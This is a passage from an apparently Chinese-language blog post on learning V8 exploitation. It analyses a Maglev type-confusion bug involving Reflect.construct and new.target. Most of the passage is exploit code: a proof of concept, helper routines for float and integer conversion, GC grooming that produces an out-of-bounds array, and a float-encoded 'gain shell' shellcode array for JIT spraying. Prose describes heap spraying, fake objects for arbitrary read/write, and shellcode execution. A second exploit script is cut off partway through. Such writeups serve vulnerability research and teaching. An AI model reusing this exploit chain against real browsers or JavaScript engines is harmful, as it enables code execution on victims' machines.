broker-&gt;dependencies()-&gt;DependOnInitialMapInstanceSizePrediction(</span><br><span class="line">          constructor);</span><br><span class="line">  inobject_properties = prediction.inobject_property_count();</span><br><span class="line">  instance_size = prediction.instance_size();</span><br><span class="line">  fields = zone-&gt;NewArray&lt;FastField&gt;(inobject_properties);</span><br><span class="line">  ClearFields();</span><br><span class="line">  elements = FastFixedArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后可以看到这里没有check根据constructor.initial_map来初始化对象的map，也就是base的initial_map，然后根据当前Base的构造函数预测该构造函数实例化对象的最终属性数量和大小，最后就是为这个对象分配内存</p><p>可以看出当快速通道走这条路径时并没有检测target与new_target的map的类型是否一致的情况，如果target是JSObject类型new_target是JSArray类型那么就可以造成类型混淆</p><p>下面给出根据走上述有漏洞路径的poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var x = Array;</span><br><span class="line"> </span><br><span class="line">class Base &#123;&#125;</span><br><span class="line"> </span><br><span class="line">class Derived extends Base &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    x = new.target;</span><br><span class="line">    super();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function construct() &#123;</span><br><span class="line">  var r = Reflect.construct(Derived, [], x);</span><br><span class="line">  return r;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">%PrepareFunctionForOptimization(Derived);</span><br><span class="line">construct();</span><br><span class="line">construct();</span><br><span class="line">%OptimizeMaglevOnNextCall(Derived);</span><br><span class="line"> </span><br><span class="line">var arr = construct();</span><br><span class="line">// console.log(arr.length);</span><br><span class="line">%DebugPrint(arr);</span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208203420035.png" alt="image-20251208203420035"></p><p>可以看出这里输出了lenth字段，但是由于是通过类型混淆后lenth并没被初始化所以这里是0</p><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/971428_VMV4QRAKRMGNV3T.png" alt="img"></p><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/971428_9YEA5TJU9N9S5QS.png" alt="img"></p><p>不过可以利用gc回收机制，让分配的对象覆盖到原来可能残留的数据上，又因为lenth并没被初始化，所以lenth区域的残留数据(如果有)是并不会被覆盖的，那么如果lenth刚好是一个很大的值，那么就可以有一个oob了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new Array(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// gain shell</span><br><span class="line">const shellcode = () =&gt; &#123;return [</span><br><span class="line">    1.9553825422107533e-246,</span><br><span class="line">    1.9560612558242147e-246,</span><br><span class="line">    1.9995714719542577e-246,</span><br><span class="line">    1.9533767332674093e-246,</span><br><span class="line">    2.6348604765229606e-284</span><br><span class="line">];&#125;</span><br><span class="line"> </span><br><span class="line">for(let i = 0; i&lt; 40000; i++)&#123;</span><br><span class="line">    shellcode();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var x = Array;</span><br><span class="line"> </span><br><span class="line">class Base &#123;&#125;</span><br><span class="line"> </span><br><span class="line">class Derived extends Base &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    x = new.target;</span><br><span class="line">    super();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function construct() &#123;</span><br><span class="line">    var res = Reflect.construct(Derived, [], x);</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">for (let i = 0; i &lt; 2000; i++) construct();</span><br><span class="line"> </span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">//gc();</span><br><span class="line">//gc();</span><br><span class="line">//gc();</span><br><span class="line">let oob_array = construct();</span><br><span class="line">oob_array = construct();</span><br><span class="line">p(oob_array);</span><br><span class="line">hexx(&#x27;lenth&#x27;,oob_array.length)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208204255697.png" alt="image-20251208204255697"></p><p>可以看到lenth很大符合我们的要求，通常代码结构不变时lenth处的残留数据值也不变</p><p>然后说一下调试时会遇到的问题，写exp调试时可能会加各种输出，这大概率会导致原本的lenth变成很小，或者程序崩溃</p><p>这种情况的解决办法就是增多或减少gc()数量，根据笔者调试的经验gc()的数量一般在2-5之间，这种问题目前遇到的debug输出或者改变代码结构，哪怕一行都会出现，所以调试时每次代码结构改变都得重新设置gc()数量</p><h5 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h5><p>笔者当时的想法是直接oob读出map类型混淆，实测时发现如果oob的读一些地址会直接崩溃掉，可能是地址不稳定造成的？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var oob_array = construct();</span><br><span class="line">oob_array = construct();</span><br><span class="line">let float_arr = [1.1,2.2,3.3];</span><br><span class="line">let obj = &#123;&#125;;</span><br><span class="line">let obj_arr = [obj];</span><br><span class="line">p(oob_array);</span><br><span class="line">p(obj_arr);</span><br><span class="line">p(float_arr);</span><br><span class="line">console.log(oob_array.length);</span><br><span class="line">var confused_element_addr = 0x219 - 1 + 8;</span><br><span class="line">let map = i2lo(oob_array[(0x25f1c8 - confused_element_addr)/8]);</span><br><span class="line">console.log(hex(map));</span><br></pre></td></tr></table></figure><p>下面参考了flyyyy师傅的方法利用Heap Spary在堆上喷一个victim_array，因为Heap Spary victim_array相对oob_array的地址比较稳定</p><p>然后就去伪造一个map以及fakeobject进行任意地址读写，最后JIT Spary执行shellcode 不过实际测试下来因为Heap Spary所以map的地址也基本稳定，所以可以不伪造map也行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + 